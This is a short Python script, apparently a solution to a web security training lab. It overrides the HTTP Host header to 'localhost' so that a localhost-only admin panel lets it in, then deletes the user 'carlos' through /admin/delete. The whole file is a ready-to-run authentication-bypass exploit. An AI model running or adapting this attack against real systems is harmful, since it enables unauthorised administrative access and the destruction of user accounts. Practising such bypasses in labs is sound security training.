import sys
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.poolmanager import PoolManager

class HostHeaderSSLAdapter(HTTPAdapter):
    def __init__(self, host_header=None, **kwargs):
        self.host_header = host_header
        super().__init__(**kwargs)
    def init_poolmanager(self, *args, **kwargs):
        self.poolmanager = PoolManager(*args, **kwargs)
    def send(self, request, **kwargs):
        if self.host_header:
            request.headers['Host'] = self.host_header
        return super().send(request, **kwargs)

if len(sys.argv) != 2:
    print("Usage: python3 script.py <base_url>")
    sys.exit(1)

base_url = sys.argv[1]
delete_url = base_url + '/admin/delete?username=carlos'
admin_url = base_url + '/admin'

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'})

session.get(admin_url)
session.mount('https://', HostHeaderSSLAdapter(host_header='localhost'))
session.get(admin_url)
response = session.get(delete_url)

